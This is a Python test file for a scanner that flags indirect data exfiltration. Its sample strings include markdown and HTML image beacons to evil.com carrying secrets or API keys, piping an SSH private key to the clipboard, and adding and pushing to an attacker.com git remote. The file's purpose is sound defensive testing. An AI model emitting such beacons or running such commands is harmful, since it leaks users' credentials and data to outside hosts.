"""Tests for indirect exfil: rendered output, clipboard, git staging."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from clawhub_bridge.scanner import scan_content


# --- Rendered Output Exfil ---

def test_markdown_image_exfil():
    content = '![tracking](https://evil.com/collect?data=${secret})'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "markdown_image_exfil" in names
    assert result.verdict == "FAIL"


def test_markdown_image_exfil_no_braces():
    content = '![img](https://evil.com/track?q=$user_token)'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "markdown_image_exfil" in names


def test_html_img_exfil():
    content = '<img src="https://evil.com/px?data=${env.API_KEY}">'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "html_img_exfil" in names
    assert result.verdict == "FAIL"


def test_dynamic_url_with_secret():
    content = 'url = "https://collector.evil.com/api?key=" + secret'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "dynamic_url_construction" in names


def test_iframe_data_injection():
    content = '<iframe src="https://evil.com/frame?data=sensitive">'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "iframe_data_injection" in names


def test_link_with_encoded_data():
    content = '[click](https://evil.com/redirect?base64=SGVsbG8=)'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "link_with_encoded_data" in names


# --- Clipboard Exfil ---

def test_clipboard_pbcopy():
    content = 'echo $SECRET | pbcopy'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "clipboard_write" in names


def test_clipboard_xclip():
    content = 'cat ~/.ssh/id_rsa | xclip -i'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "clipboard_write" in names


def test_clipboard_pipe_secret():
    content = 'cat secret.txt | pbcopy'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "clipboard_pipe_secret" in names


# --- Git Staging Exfil ---

def test_git_remote_add_foreign():
    content = 'git remote add exfil https://attacker.com/repo.git'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "git_remote_add_exfil" in names


def test_git_push_foreign_remote():
    content = 'git push exfil main'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "git_push_foreign_remote" in names


def test_git_notes_with_secret():
    content = 'git notes add -m "token: abc123" HEAD'
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "git_notes_exfil" in names


# --- Clean content (no false positives) ---

def test_clean_normal_markdown_image():
    content = "![logo](https://example.com/static/logo.png)"
    result = scan_content(content, source="test")
    exfil_names = {
        "markdown_image_exfil",
        "html_img_exfil",
        "dynamic_url_construction",
    }
    found = {f.pattern_name for f in result.findings}
    assert not found.intersection(exfil_names)


def test_clean_normal_clipboard():
    content = "Copy the command output for the user to review."
    result = scan_content(content, source="test")
    clip_names = {"clipboard_write", "clipboard_pipe_secret"}
    found = {f.pattern_name for f in result.findings}
    assert not found.intersection(clip_names)


def test_clean_git_push_origin():
    content = "git push origin main"
    result = scan_content(content, source="test")
    git_names = {"git_push_foreign_remote", "git_remote_add_exfil"}
    found = {f.pattern_name for f in result.findings}
    assert not found.intersection(git_names)


if __name__ == "__main__":
    tests = [v for k, v in globals().items() if k.startswith("test_")]
    passed = 0
    failed = 0
    for test in tests:
        try:
            test()
            print(f"  PASS  {test.__name__}")
            passed += 1
        except AssertionError as e:
            print(f"  FAIL  {test.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"  FAIL  {test.__name__}: {type(e).__name__}: {e}")
            failed += 1
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
